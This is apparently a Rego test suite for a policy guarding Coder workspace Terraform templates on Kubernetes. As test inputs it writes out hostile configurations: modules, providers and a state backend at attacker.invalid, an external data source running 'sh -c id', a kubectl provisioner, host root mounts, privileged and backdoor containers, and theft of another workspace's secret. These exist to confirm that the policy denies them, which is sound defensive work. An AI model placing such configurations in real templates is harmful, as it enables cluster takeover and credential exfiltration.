package terraform.workspace

import rego.v1

digest := "sha256:0000000000000000000000000000000000000000000000000000000000000000"

secure_pod_spec := {
	"automount_service_account_token": false,
	"service_account_name": "${kubernetes_service_account_v1.workspace.metadata[0].name}",
	"node_selector": {"cloud.google.com/compute-class": "cpu-coder-class"},
	"security_context": [{"fs_group": "1000", "run_as_non_root": true, "run_as_user": "1000"}],
	"container": [{
		"command": ["sh", "-c", "${local.logger_script}\n\n${coder_agent.main.init_script}"],
		"env": [
			{"name": "CODER_AGENT_TOKEN", "value": "${coder_agent.main.token}"},
			{"name": "CODER_AGENT_SUBSYSTEM", "value": "exectrace"},
			{"name": "JUDGES_OPENAI_BASE_URL", "value": "${var.judges_openai_base_url}"},
			{"name": "GITHUB_TOKEN", "value": "${module.git_utilities.github_token}"},
		],
		"image": "${local.base_image}",
		"image_pull_policy": "IfNotPresent",
		"name": "dev",
		"resources": [{}],
		"security_context": [{"run_as_user": "1000"}],
		"volume_mount": [{"mount_path": "${local.home_dir}", "name": "home", "read_only": false}],
	}],
	"volume": [{
		"name": "home",
		"persistent_volume_claim": [{"claim_name": "${kubernetes_persistent_volume_claim.home.metadata[0].name}"}],
	}],
}

secure_service_account := {"automount_service_account_token": false}

secure_locals := {
	"base_image": "${local.base_image_repo}@${local.base_image_digest}",
	"base_image_digest": digest,
	"labels": approved_workspace_labels.cpu,
}

terraform_contents(pod_spec, service_account, local_values, deployment_extra, extra_resources) := {
	"locals": [local_values],
	"provider": {
		"coder": [{"url": "${var.coder_url}"}],
		"kubernetes": [{"config_path": null}],
	},
	"terraform": [{"required_providers": [approved_required_providers]}],
	"resource": object.union(
		{
			"kubernetes_deployment_v1": {
				"main": [object.union(
					{"spec": [{"template": [{
						"metadata": [{
							"annotations": "${merge(local.annotations, {\n  \"sidecar.istio.io/inject\" = \"false\"\n})}",
							"labels": "${local.labels}",
						}],
						"spec": [pod_spec],
					}]}]},
					deployment_extra,
				)],
			},
			"kubernetes_service_account_v1": {
				"workspace": [service_account],
			},
		},
		extra_resources,
	),
}

combined_for_directory(contents, variables, directory) := [
	{"path": sprintf("templates/%s/main.tf", [directory]), "contents": contents},
	{"path": sprintf("templates/%s/variables.tf", [directory]), "contents": variables},
]

combined(contents, variables) := combined_for_directory(contents, variables, "cpu-k8s")

secure_input := combined(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {})

test_secure_workspace_template_allowed if count(deny) == 0 with input as secure_input

test_workspace_deployment_required if {
	contents := terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {})
	resources := object.remove(contents.resource, {"kubernetes_deployment_v1"})
	without_resources := object.remove(contents, {"resource"})
	input_documents := combined(object.union(without_resources, {"resource": resources}), {})
	"workspace template must define exactly one kubernetes_deployment_v1, found 0" in deny with input as input_documents
}

test_workspace_pod_automount_omitted_denied if {
	pod_spec := object.remove(secure_pod_spec, {"automount_service_account_token"})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace deployment must set automount_service_account_token = false" in deny with input as input_documents
}

test_workspace_host_network_denied if {
	pod_spec := object.union(secure_pod_spec, {"host_network": true, "host_pid": true})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace deployment must not enable host_network" in deny with input as input_documents
	"workspace deployment must not enable host_pid" in deny with input as input_documents
}

test_workspace_privileged_dev_container_denied if {
	dev := object.union(secure_pod_spec.container[0], {"security_context": [{"privileged": true}]})
	pod_spec := object.union(secure_pod_spec, {"container": [dev]})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace dev container must not be privileged" in deny with input as input_documents
}

test_workspace_host_path_denied if {
	pod_spec := object.union(secure_pod_spec, {"volume": [{"host_path": [{"path": "/"}]}]})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace deployment must not mount host paths" in deny with input as input_documents
}

test_workspace_coder_service_account_denied if {
	pod_spec := object.union(secure_pod_spec, {"service_account_name": "coder"})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace deployment has an unapproved service_account_name expression: \"coder\"" in deny with input as input_documents
}

test_workspace_variable_service_account_denied if {
	pod_spec := object.union(secure_pod_spec, {"service_account_name": "${var.workspace_sa}"})
	variables := {"variable": {"workspace_sa": [{"default": "coder"}]}}
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), variables)
	"workspace deployment has an unapproved service_account_name expression: \"${var.workspace_sa}\"" in deny with input as input_documents
}

test_workspace_service_account_automount_omitted_denied if {
	input_documents := combined(terraform_contents(secure_pod_spec, {}, secure_locals, {}, {}), {})
	"workspace ServiceAccount must set automount_service_account_token = false" in deny with input as input_documents
}

test_workspace_mutable_base_image_denied if {
	local_values := object.union(secure_locals, {"base_image": "registry.example/workspace:latest"})
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, local_values, {}, {}), {})
	"workspace base_image \"registry.example/workspace:latest\" is not composed from the declared digest" in deny with input as input_documents
}

test_workspace_at_latest_base_image_denied if {
	local_values := object.union(secure_locals, {"base_image": "registry.example/workspace@latest"})
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, local_values, {}, {}), {})
	"workspace base_image \"registry.example/workspace@latest\" is not composed from the declared digest" in deny with input as input_documents
}

test_workspace_invalid_digest_denied if {
	local_values := object.union(secure_locals, {"base_image_digest": "sha256:not-a-digest"})
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, local_values, {}, {}), {})
	"workspace base image digest \"sha256:not-a-digest\" is invalid" in deny with input as input_documents
}

test_alternate_pod_resource_denied if {
	pod := {"backdoor": [{"spec": [{"service_account_name": "coder"}]}]}
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {"kubernetes_pod_v1": pod}), {})
	"workspace template contains unapproved resource type \"kubernetes_pod_v1\"" in deny with input as input_documents
}

test_computed_kubernetes_manifest_denied if {
	manifest := {"backdoor": [{"manifest": {"kind": "${join(\"\", [\"P\", \"od\"])}"}}]}
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {"kubernetes_manifest": manifest}), {})
	"workspace template contains unapproved resource type \"kubernetes_manifest\"" in deny with input as input_documents
}

test_unapproved_module_source_denied if {
	contents := object.union(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {
		"module": {"logger": [{"source": "git::https://attacker.invalid/logger.git?ref=main"}]},
	})
	input_documents := combined(contents, {})
	"workspace module \"logger\" has unapproved source \"git::https://attacker.invalid/logger.git?ref=main\"" in deny with input as input_documents
}

test_unapproved_data_source_denied if {
	contents := object.union(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {
		"data": {"external": {"backdoor": [{"program": ["sh", "-c", "id"]}]}},
	})
	input_documents := combined(contents, {})
	"workspace template contains unapproved data source type \"external\"" in deny with input as input_documents
}

test_unapproved_required_provider_denied if {
	contents := object.union(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {
		"terraform": [{"required_providers": [object.union(approved_required_providers, {
			"backdoor": {"source": "attacker/backdoor", "version": "1.0.0"},
		})]}],
	})
	input_documents := combined(contents, {})
	"workspace required providers must match the reviewed sources and versions" in deny with input as input_documents
}

test_unapproved_provider_configuration_denied if {
	contents := object.union(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {
		"provider": {
			"coder": [{"url": "${var.coder_url}"}],
			"kubernetes": [{"host": "https://attacker.invalid", "token": "${var.token}"}],
		},
	})
	input_documents := combined(contents, {})
	"workspace provider \"kubernetes\" has unapproved configuration" in deny with input as input_documents
}

test_backend_configuration_denied if {
	contents := object.union(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, {}), {
		"terraform": [{
			"backend": {"http": [{"address": "https://attacker.invalid/state"}]},
			"required_providers": [approved_required_providers],
		}],
	})
	input_documents := combined(contents, {})
	"workspace terraform block may contain only required_providers" in deny with input as input_documents
}

test_local_exec_provisioner_denied if {
	provisioner := {"local-exec": [{"command": "kubectl auth can-i --list"}]}
	extra := {"coder_metadata": {"backdoor": [{"provisioner": provisioner}]}}
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, secure_locals, {}, extra), {})
	"workspace resource coder_metadata.backdoor must not run provisioners" in deny with input as input_documents
}

test_backdoor_sidecar_denied if {
	pod_spec := object.union(secure_pod_spec, {"container": array.concat(secure_pod_spec.container, [{
		"name": "backdoor",
		"image": "registry.example/backdoor:latest",
	}])})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace container \"backdoor\" has unapproved image expression \"registry.example/backdoor:latest\"" in deny with input as input_documents
}

test_dynamic_container_denied if {
	pod_spec := object.union(secure_pod_spec, {"dynamic": {"container": [{"for_each": "${var.containers}"}]}})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"workspace pod spec contains unapproved dynamic blocks" in deny with input as input_documents
}

test_workspace_network_identity_relabel_denied if {
	labels := object.union(secure_locals.labels, {"app.kubernetes.io/name": "coder"})
	local_values := object.union(secure_locals, {"labels": labels})
	input_documents := combined(terraform_contents(secure_pod_spec, secure_service_account, local_values, {}, {}), {})
	"cpu workspace local labels must match the reviewed network and admission identity" in deny with input as input_documents
}

test_workspace_static_secret_reference_denied if {
	secret_env := {
		"name": "BACKDOOR_TOKEN",
		"value_from": [{"secret_key_ref": [{"name": "other-workspace", "key": "token"}]}],
	}
	dev := object.union(secure_pod_spec.container[0], {"env": array.concat(secure_pod_spec.container[0].env, [secret_env])})
	pod_spec := object.union(secure_pod_spec, {"container": [dev]})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"cpu workspace dev environment must match the reviewed sources" in deny with input as input_documents
}

test_workspace_nested_dynamic_host_path_denied if {
	volume := {
		"name": "host",
		"dynamic": {"host_path": [{
			"for_each": "${[1]}",
			"content": [{"path": "/"}],
		}]},
	}
	pod_spec := object.union(secure_pod_spec, {"volume": [volume]})
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), {})
	"cpu workspace pod volumes must match the reviewed PVC and temporary volumes" in deny with input as input_documents
}

test_phi_mesh_injection_must_remain_enabled if {
	local_values := object.union(secure_locals, {"labels": approved_workspace_labels.phi})
	contents := terraform_contents(secure_pod_spec, secure_service_account, local_values, {}, {})
	input_documents := combined_for_directory(contents, {}, "phi-gpu-k8s")
	"phi workspace pod annotations must preserve the reviewed mesh controls" in deny with input as input_documents
}

test_phi_dev_security_controls_required if {
	bad_context := [{
		"allow_privilege_escalation": true,
		"capabilities": [{"drop": []}],
		"read_only_root_filesystem": false,
		"run_as_user": 0,
	}]
	dev := object.union(secure_pod_spec.container[0], {"security_context": bad_context})
	pod_spec := object.union(secure_pod_spec, {
		"container": [dev],
		"security_context": approved_pod_security_contexts.phi,
	})
	local_values := object.union(secure_locals, {"labels": approved_workspace_labels.phi})
	contents := terraform_contents(pod_spec, secure_service_account, local_values, {}, {})
	input_documents := combined_for_directory(contents, {}, "phi-gpu-k8s")
	"phi workspace dev security context must match the reviewed settings" in deny with input as input_documents
}

test_secure_gpu_utd_service_account_allowed if {
	service_account_expression := "${local.utd_bucket_enabled ? (\n var.gpu_workspace_utd_service_account\n ) : (\n kubernetes_service_account_v1.workspace[0].metadata[0].name\n )}"
	pod_spec := object.union(secure_pod_spec, {"service_account_name": service_account_expression})
	precondition := {"lifecycle": [{"precondition": [{
		"condition": "${!local.utd_bucket_enabled || var.gpu_workspace_utd_service_account != \"\"}",
	}]}]}
	variables := {"variable": {"gpu_workspace_utd_service_account": [{"default": ""}]}}
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, precondition, {}), variables)
	count(deny) == 0 with input as input_documents
}

test_utd_variable_unsafe_default_denied if {
	service_account_expression := "${local.utd_bucket_enabled ? (\n var.gpu_workspace_utd_service_account\n ) : (\n kubernetes_service_account_v1.workspace[0].metadata[0].name\n )}"
	pod_spec := object.union(secure_pod_spec, {"service_account_name": service_account_expression})
	precondition := {"lifecycle": [{"precondition": [{
		"condition": "${!local.utd_bucket_enabled || var.gpu_workspace_utd_service_account != \"\"}",
	}]}]}
	variables := {"variable": {"gpu_workspace_utd_service_account": [{"default": "coder"}]}}
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, precondition, {}), variables)
	"gpu_workspace_utd_service_account must default to empty so the UTD precondition controls its use" in deny with input as input_documents
}

test_utd_precondition_required if {
	service_account_expression := "${local.utd_bucket_enabled ? (\n var.gpu_workspace_utd_service_account\n ) : (\n kubernetes_service_account_v1.workspace[0].metadata[0].name\n )}"
	pod_spec := object.union(secure_pod_spec, {"service_account_name": service_account_expression})
	variables := {"variable": {"gpu_workspace_utd_service_account": [{"default": ""}]}}
	input_documents := combined(terraform_contents(pod_spec, secure_service_account, secure_locals, {}, {}), variables)
	"workspace deployment using gpu_workspace_utd_service_account must fail when UTD is enabled and the variable is empty" in deny with input as input_documents
}
